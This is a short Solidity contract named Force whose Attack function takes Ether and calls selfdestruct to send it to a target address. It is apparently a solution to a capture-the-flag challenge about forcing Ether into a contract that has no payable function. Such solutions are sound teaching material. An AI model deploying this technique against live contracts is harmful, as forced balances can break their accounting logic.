// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;


contract Force {
   
   address payable lib;
   mapping(address => uint) balances;
 
   constructor(address _contractAddress)
   {
     lib = payable(address(_contractAddress));
   }
  

   function Attack() public payable{
   require(msg.value >0,"value should be greater than 0");
   selfdestruct(lib);
   
   }

}
